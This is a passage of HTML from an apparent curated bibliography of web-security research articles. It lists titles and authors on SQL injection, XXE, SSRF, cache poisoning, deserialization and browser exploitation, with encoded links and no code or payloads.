data-url=\"aHR0cDovL3d3dy5qaW5nbGluZ3NodS5vcmcvP3A9MjIyMA==\">jinglingshu</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMzY2ODMuaHRtbA==\">见招拆招：绕过 WAF 继续 SQL 注入常用方法</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hdXRob3IvbWlrZXk=\">mikey</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG9jcy9lbmdsaXNoLzM3OTUzLW15c3FsLWVycm9yLWJhc2VkLXNxbC1pbmplY3Rpb24tdXNpbmctZXhwLnBkZg==\">MySQL Error Based SQL Injection Using EXP</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9vc2FuZGFtYWxpdGg=\">@osandamalith</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3pvbWJpZWhlbHA1NC5ibG9nc3BvdC5qcC8yMDE3LzAyL3NxbC1pbmplY3Rpb24taW4tdXBkYXRlLXF1ZXJ5LWJ1Zy5odG1s\">SQL injection in an UPDATE query - a bug bounty story!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3pvbWJpZWhlbHA1NC5ibG9nc3BvdC5qcC8=\">Zombiehelp54</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3LzIwMTcvMDEvYnVnLWJvdW50eS1naXRodWItZW50ZXJwcmlzZS1zcWwtaW5qZWN0aW9uLmh0bWw=\">GitHub Enterprise SQL Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B0b21ub21ub20vbWFraW5nLWEtYmxpbmQtc3FsLWluamVjdGlvbi1hLWxpdHRsZS1sZXNzLWJsaW5kLTQyOGRjYjYxNGJhOA==\">Making a Blind SQL Injection a little less blind</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Ub21Ob21Ob20=\">TomNomNom</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFybG9naWMuY29tL2VuL2Jsb2cvcmVkLXRlYW0tdGFsZXMtMHgwMS8=\">Red Team Tales 0x01: From MSSQL to RCE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFybG9naWMuY29tL2VuL2N5YmVyc2VjdXJpdHktYmxvZy8=\">Tarlogic</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wdWxzZXNlY3VyaXR5LmNvLm56L2FydGljbGVzL3Bvc3RncmVzLXNxbGk=\">SQL INJECTION AND POSTGRES - AN ADVENTURE TO EVENTUAL RCE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RlbmFuZHo=\">@denandz</span>.</li>\n</ul>\n<p><a name=\"tricks-nosql-injection\"></a></p>\n<h3 id=\"nosql-injection\"><a class=\"anchor\" href=\"#nosql-injection\">#</a> NoSQL Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wZXRlY29yZXkuY29tL2Jsb2cvMjAxNy8wNi8xMi9ncmFwaHFsLW5vc3FsLWluamVjdGlvbi10aHJvdWdoLWpzb24tdHlwZXMv\">GraphQL NoSQL Injection Through JSON Types</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wZXRlY29yZXkuY29tL3dvcmsv\">Pete</span>.</li>\n</ul>\n<p><a name=\"tricks-ftp-injection\"></a></p>\n<h3 id=\"ftp-injection-2\"><a class=\"anchor\" href=\"#ftp-injection-2\">#</a> FTP Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vZXUtMTMvYnJpZWZpbmdzL09zaXBvdi9iaC1ldS0xMy1YTUwtZGF0YS1vc2lwb3Ytc2xpZGVzLnBkZg==\">XML Out-Of-Band Data Retrieval</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hNjZhdA==\">@a66at</span> and Alexey Osipov.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2xhYi5vbnNlYy5ydS8yMDE0LzA2L3h4ZS1vb2ItZXhwbG9pdGF0aW9uLWF0LWphdmEtMTcuaHRtbA==\">XXE OOB exploitation at Java 1.7+</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2xhYi5vbnNlYy5ydS8=\">Ivan Novikov</span>.</li>\n</ul>\n<p><a name=\"tricks-xxe\"></a></p>\n<h3 id=\"xxe-2\"><a class=\"anchor\" href=\"#xxe-2\">#</a> XXE</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2hlbWl2LmNvbS9hbGwvZXZpbC14bWwv\">Evil XML with two encodings</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2hlbWl2LmNvbS8=\">Arseniy Sharoglazov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NlY2xpc3RzLm9yZy9mdWxsZGlzY2xvc3VyZS8yMDE4L0p1bC8z\">XXE in WeChat Pay Sdk ( WeChat leave a backdoor on merchant websites)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9jb2Rlc2h0b29s\">Rose Jackcode</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vZXUtMTMvYnJpZWZpbmdzL09zaXBvdi9iaC1ldS0xMy1YTUwtZGF0YS1vc2lwb3Ytc2xpZGVzLnBkZg==\">XML Out-Of-Band Data Retrieval</span> - Written by Timur Yunusov and Alexey Osipov.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2xhYi5vbnNlYy5ydS8yMDE0LzA2L3h4ZS1vb2ItZXhwbG9pdGF0aW9uLWF0LWphdmEtMTcuaHRtbA==\">XXE OOB exploitation at Java 1.7+ (2014)</span>: Exfiltration using FTP protocol - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9kMHpucHAv\">Ivan Novikov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9za2F2YW5zLnJ1L2VuLzIwMTcvMTIvMDIveHhlLW9vYi1leHRyYWN0aW5nLXZpYS1odHRwZnRwLXVzaW5nLXNpbmdsZS1vcGVuZWQtcG9ydC8=\">XXE OOB extracting via HTTP+FTP using single opened port</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9za2F2YW5zLnJ1Lw==\">skavans</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yMDEzLmFwcHNlY3VzYS5vcmcvMjAxMy93cC1jb250ZW50L3VwbG9hZHMvMjAxMy8xMi9XaGF0WW91RGlkbnRLbm93QWJvdXRYWEVBdHRhY2tzLnBkZg==\">What You Didn't Know About XML External Entities Attacks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9lY2JmdHc=\">Timothy D. Morgan</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3luYWNrdGl2LmNvbS9yZXNzb3VyY2VzL3N5bmFja3Rpdl9kcnVwYWxfeHhlX3NlcnZpY2VzLnBkZg==\">Pre-authentication XXE vulnerability in the Services Drupal module</span> -  Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9fbTBiaXVz\">Renaud Dubourguais</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZm9yY2luZy14eGUtcmVmbGVjdGlvbi1zZXJ2ZXItZXJyb3ItbWVzc2FnZXMv\">Forcing XXE Reflection through Server Error Messages</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vYXV0aG9yL2FudHRpLXJhbnRhc2Fhcmkv\">Antti Rantasaari</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2hlbWl2LmNvbS9hbGwvZXhwbG9pdGluZy14eGUtd2l0aC1sb2NhbC1kdGQtZmlsZXMv\">Exploiting XXE with local DTD files</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9fbW9oZW1pdg==\">Arseniy Sharoglazov</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29zZWN1cmUubmV0L2Jsb2cvMjAxOS8wNy8xNi9hdXRvbWF0aW5nLWxvY2FsLWR0ZC1kaXNjb3ZlcnktZm9yLXh4ZS1leHBsb2l0YXRpb24=\">Automating local DTD discovery for XXE exploitation</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oM3hzdHJlYW0=\">Philippe Arteau</span>.</li>\n</ul>\n<p><a name=\"tricks-ssrf\"></a></p>\n<h3 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHR0YW5nLmNvbS9hcmNoaXZlLzEyOTMv\">IPv6 三个访问本地地址的小 Tips</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHR0YW5nLmNvbS91c2VyL3BoaXRoMG4=\">phith0n</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovLzEwZGVncmVzLm5ldC9hd3MtdGFrZW92ZXItdGhyb3VnaC1zc3JmLWluLWphdmFzY3JpcHQv\">AWS takeover through SSRF in JavaScript</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovLzEwZGVncmVzLm5ldC8=\">Gwen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMzQxODc2\">SSRF in Exchange leads to ROOT access in all instances</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS8weGFjYg==\">@0xacb</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMzQxODc2\">SSRF to ROOT Access</span> - A $25k bounty for SSRF leading to ROOT Access in all instances by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tLzB4YWNi\">0xacb</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3BocC1zc3JmLXRlY2huaXF1ZXMtOWQ0MjJjYjI4ZDUx\">PHP SSRF Techniques</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B0aGVtaWRkbGVibHVl\">@themiddleblue</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMTE1NzQ4\">SSRF in https://imgur.com/vidgif/url</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2Flc3RlcmFs\">aesteral</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXV4eS54eXovd2ViJTIwc2VjdXJpdHkvMjAxNy8wNy8wNi9hbGwtc3NyZi1rbm93bGVkZ2UuaHRtbA==\">All you need to know about SSRF and how may we write tools to do auto-detect</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9BdXh5MjMz\">@Auxy233</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMTM1MzQyLmh0bWw=\">SSRF 漏洞中绕过 IP 限制的几种方法总结</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hdXRob3IvYXJrdGVhbQ==\">arkteam</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTcvdGh1cnNkYXkvdXMtMTctVHNhaS1BLU5ldy1FcmEtT2YtU1NSRi1FeHBsb2l0aW5nLVVSTC1QYXJzZXItSW4tVHJlbmRpbmctUHJvZ3JhbW1pbmctTGFuZ3VhZ2VzLnBkZg==\">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3Lw==\">Orange</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLzIwMTYvMDcvMDMvU1NSRi1UaXBzLw==\">SSRF Tips</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuc2FmZWJ1ZmYuY29tLw==\">xl7dev</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLzIwMTgvMDcvaW50by10aGUtYm9yZy1zc3JmLWluc2lkZS1nb29nbGUtcHJvZHVjdGlvbi1uZXR3b3JrLw==\">Into the Borg – SSRF inside Google production network</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcG5zZWMuY29tLw==\">opnsec</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2J1Z2JvdW50eXdyaXRldXAvcGllcmNpbmctdGhlLXZlaWwtc2VydmVyLXNpZGUtcmVxdWVzdC1mb3JnZXJ5LXRvLW5pcHJuZXQtYWNjZXNzLWMzNThmZDVlMjQ5YQ==\">Piercing the Veil: Server Side Request Forgery to NIPRNet access</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BhbHlzc2Euby5oZXJyZXJh\">Alyssa Herrera</span>.</li>\n</ul>\n<p><a name=\"tricks-web-cache-poisoning\"></a></p>\n<h3 id=\"web-cache-poisoning-2\"><a class=\"anchor\" href=\"#web-cache-poisoning-2\">#</a> Web Cache Poisoning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3Npbmctd2ViLWNhY2hlLXBvaXNvbmluZy1jb3VudGVybWVhc3VyZXM=\">Bypassing Web Cache Poisoning Countermeasures</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hbGJpbm93YXg=\">@albinowax</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWIud2FsbGFybS5jb20vY2FjaGUtcG9pc29uaW5nLWFuZC1vdGhlci1kaXJ0eS10cmlja3MtMTIwNDY4ZjEwNTNm\">Cache poisoning and other dirty tricks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxsYXJtLmNvbS8=\">Wallarm</span>.</li>\n</ul>\n<p><a name=\"tricks-header-injection\"></a></p>\n<h3 id=\"header-injection\"><a class=\"anchor\" href=\"#header-injection\">#</a> Header Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuYmxpbmRzcG90c2VjdXJpdHkuY29tLzIwMTcvMDIvYWR2aXNvcnktamF2YXB5dGhvbi1mdHAtaW5qZWN0aW9ucy5odG1s\">Java/Python FTP Injections Allow for Firewall Bypass</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wbHVzLmdvb2dsZS5jb20vMTA1OTE3NjE4MDk5NzY2ODMxNTg5\">Timothy Morgan</span>.</li>\n</ul>\n<p><a name=\"tricks-url\"></a></p>\n<h3 id=\"url\"><a class=\"anchor\" href=\"#url\">#</a> URL</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub25jb21iYXRhbnQub3JnLzIwMTcvMTEvMDcvcHJvYmxlbXMtb2YtdXJscy8=\">Some Problems Of URLs</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub25jb21iYXRhbnQub3JnL2Fib3V0Lw==\">Chris Palmer</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BocC5waC93eWRyb3BzL2Ryb3BzL1VSTCUyMEhhY2tpbmclMjAtJTIwJUU1JTg5JThEJUU3JUFCJUFGJUU3JThDJUE1JUU3JTkwJTkwJUU2JUI1JTgxLnBkZg==\">URL Hacking - 前端猥琐流</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3hzc2VjLmxvZnRlci5jb20v\">0x_Jin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueHVkb25nei5jb20vYmxvZy8yMDE3L2lkbi1waGlzaGluZy8=\">Phishing with Unicode Domains</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueHVkb25nei5jb20v\">Xudong Zheng</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmdyc2VjLmNvbS9wb3N0MjAxNzAyMTkuaHRtbA==\">Unicode Domains are bad and you should feel bad for supporting them</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmdyc2VjLmNvbS8=\">VRGSEC</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuYmxhY2tmYW4ucnUvMjAxNy8wOS9kZXZ0d2l0dGVyY29tLXhzcy5odG1s\">[dev.twitter.com] XSS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuYmxhY2tmYW4ucnUv\">Sergey Bobrov</span>.</li>\n</ul>\n<p><a name=\"tricks-deserialization\"></a></p>\n<h3 id=\"deserialization-2\"><a class=\"anchor\" href=\"#deserialization-2\">#</a> Deserialization</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmNjZ3JvdXAudHJ1c3QvdWsvYWJvdXQtdXMvbmV3c3Jvb20tYW5kLWV2ZW50cy9ibG9ncy8yMDE4L2F1Z3VzdC9hc3BuZXQtcmVzb3VyY2UtZmlsZXMtcmVzeC1hbmQtZGVzZXJpYWxpc2F0aW9uLWlzc3Vlcy8=\">ASP.NET resource files (.RESX) and deserialisation issues</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9pcnNkbA==\">@irsdl</span>.</li>\n</ul>\n<p><a name=\"tricks-oauth\"></a></p>\n<h3 id=\"oauth-2\"><a class=\"anchor\" href=\"#oauth-2\">#</a> OAuth</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1vbGJhaWthci5jb20vZmFjZWJvb2stb2F1dGgtZnJhbWV3b3JrLXZ1bG5lcmFiaWxpdHkv\">Facebook OAuth Framework Vulnerability</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9BbW9sQmFpa2Fy\">@AmolBaikar</span>.</li>\n</ul>\n<p><a name=\"tricks-others\"></a></p>\n<h3 id=\"others\"><a class=\"anchor\" href=\"#others\">#</a> Others</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3plcm95dS54eXovMjAxOC8xMC8xMy9waHAtYXVkaXQtdGlwcy8=\">PHP 代码审计中的一些 Tips</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3plcm95dS54eXov\">z3r0yu</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2ZyZWUtY29kZS1jYW1wL21lc3Npbmctd2l0aC10aGUtZ29vZ2xlLWJ1Z2FuaXplci1zeXN0ZW0tZm9yLTE1LTYwMC1pbi1ib3VudGllcy01OGY4NmNjOWY5YTU=\">How I hacked Google’s bug tracking system itself for $15,600 in bounties</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BhbGV4LmJpcnNhbg==\">@alex.birsan</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vU0hBUkUvc29tZS10cmlja3MtZnJvbS1teS1zZWNyZXQtZ3JvdXAuaHRtbA==\">Some Tricks From My Secret Group</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">phithon</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMUN4MHZJMk16eTB6d2RUcmdpYzNTM1R3R01DcEgtUWhNVWRIVTFyM0FZZkkvZWRpdCNzbGlkZT1pZC5nMzVmMzkxMTkyXzA2NQ==\">CTF 比赛总是输？你还差点 Tricks!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">phithon</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ldmkxY2cubWUvYXJjaGl2ZXMvRG9tYWluX0Zyb250aW5nLmh0bWw=\">隱匿的攻擊之 - Domain Fronting</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ldmkxY2cubWUv\">Evi1cg</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaWRlbWljcy1zY2VwdGljaXNtL3dyaXRpbmcvYmxvYi9tYXN0ZXIvb25pb24tZG5zLWxlYWtzLm1k\">Inducing DNS Leaks in Onion Web Services</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaWRlbWljcy1zY2VwdGljaXNt\">@epidemics-scepticism</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83MzVlOGYxNzQ2ZjA=\">web 狗要懂的内网端口转发</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vdS8xMjFiZjBmNmIzZDI=\">_阿烨_</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zMWduYWxjaGEwcy5naXRodWIuaW8vZHNwbC8yMDE4LzAzLzA3L1N0b3JlZC1YU1MtYW5kLVNTUkYtR29vZ2xlLmh0bWw=\">Stored XSS, and SSRF in Google using the Dataset Publishing Language</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaWduYWxjaGFvcw==\">@signalchaos</span>.</li>\n</ul>\n<h2 id=\"browser-exploitation\"><a class=\"anchor\" href=\"#browser-exploitation\">#</a> Browser Exploitation</h2>\n<h3 id=\"frontend-like-sop-bypass-url-spoofing-and-something-like-that\"><a class=\"anchor\" href=\"#frontend-like-sop-bypass-url-spoofing-and-something-like-that\">#</a> Frontend (like SOP bypass, URL spoofing, and something like that)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL3RoZS13b3JsZC1vZi1zaXRlLWlzb2xhdGlvbi1hbmQtY29tcHJvbWlzZWQtcmVuZGVyZXI=\">The world of Site Isolation and compromised renderer</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaGhuams=\">@shhnjk</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vZmlsZWRlc2NyaXB0b3IvdGhlLWNvb2tpZS1tb25zdGVyLWluLXlvdXItYnJvd3NlcnM=\">The Cookie Monster in Your Browsers</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9maWxlZGVzY3JpcHRvcg==\">@filedescriptor</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvYXNpYS0xNi9tYXRlcmlhbHMvYXNpYS0xNi1CYWxvY2gtQnlwYXNzaW5nLUJyb3dzZXItU2VjdXJpdHktUG9saWNpZXMtRm9yLUZ1bi1BbmQtUHJvZml0LXdwLnBkZg==\">Bypassing Mobile Browser Security For Fun And Profit</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9AcmFmYXliYWxvY2g=\">@rafaybaloch</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYW1lc2hmaXNoZXIuY29tLzIwMTkvMDQvMjcvdGhlLWluY2VwdGlvbi1iYXItYS1uZXctcGhpc2hpbmctbWV0aG9kLw==\">The inception bar: a new phishing method</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYW1lc2hmaXNoZXIuY29tLw==\">jameshfisher</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODcxOTc2Ng==\">浏览器漏洞挖掘思路</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d29zZWN1cml0eS5pby8=\">Twosecurity</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3hsYWIudGVuY2VudC5jb20vY24vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMTAvYnJvd3Nlci11aS1zZWN1cml0eS13aGl0ZXBhcGVyLnBkZg==\">Browser UI Security 技术白皮书</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3hsYWIudGVuY2VudC5jb20v\">腾讯玄武实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cucG9ydHN3aWdnZXIubmV0LzIwMTYvMTEvanNvbi1oaWphY2tpbmctZm9yLW1vZGVybi13ZWIuaHRtbA==\">JSON hijacking for the modern web</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">portswigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0V4cGxvaXRXYXJlTGFicy9waG90b3MvYS4zNjE4NTQxODM4Nzg0NjIuODQ1NDQuMzM4ODMyMzg5NTEzOTc1LzEzNzg1Nzk2NDg4NzI1NzIvP3R5cGU9MyZhbXA7dGhlYXRlcg==\">IE11 Information disclosure - local file detection</span> - Written by James Lee.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnJva2VuYnJvd3Nlci5jb20vc29wLWJ5cGFzcy11eHNzLXN0ZWFsaW5nLWNyZWRlbnRpYWxzLXByZXR0eS1mYXN0Lw==\">SOP bypass / UXSS – Stealing Credentials Pretty Fast (Edge)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9tYWdpY21hYzIwMDA=\">Manuel</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibzBvbS5ydS9zYWZhcmktY2xpZW50LXNpZGU=\">Особенности Safari в client-side атаках</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibzBvbS5ydS9hdXRob3IvYWRtaW4=\">Bo0oM</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibzBvbS5ydS9zYWZhcmktY2xpZW50LXNpZGU=\">Особенности Safari в client-side атаках</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibzBvbS5ydS9hdXRob3IvYWRtaW4=\">Bo0oM</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZG9jdW1lbnQvZC8xY2JMLVgwa1ZfdFE1ckw4WEozbFhrVi1qMHB0X0NmVHU1WlN6WXJuY1BEYy8=\">How do we Stop Spilling the Beans Across Origins?</span> - Written by <a href=\"aaj@google.com\">aaj at google.com</a> and <a href=\"mkwst@google.com\">mkwst at google.com</a>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8yMDE4LzA2L3NldHRpbmctYXJiaXRyYXJ5LXJlcXVlc3QtaGVhZGVycy1pbi5odG1s\">Setting arbitrary request headers in Chromium via CRLF injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8=\">Michał Bentkowski</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJub29uLmNvbS9pbS1oYXJ2ZXN0aW5nLWNyZWRpdC1jYXJkLW51bWJlcnMtYW5kLXBhc3N3b3Jkcy1mcm9tLXlvdXItc2l0ZS1oZXJlLXMtaG93LTlhOGNiMzQ3YzViNQ==\">I’m harvesting credit card numbers and passwords from your site. Here’s how.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJub29uLmNvbS9AZGF2aWQuZ2lsYmVydHNvbg==\">David Gilbertson</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMTg4MDg2\">Sending arbitrary IPC messages via overriding Function.prototype.apply</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9raW51Z2F3YW1hc2F0bw==\">@kinugawamasato</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9haHVzc2FtLm1lL1Rha2UtQWR2YW50YWdlLW9mLU91dC1vZi1TY29wZS1Eb21haW5zLWluLUJ1Zy1Cb3VudHkv\">Take 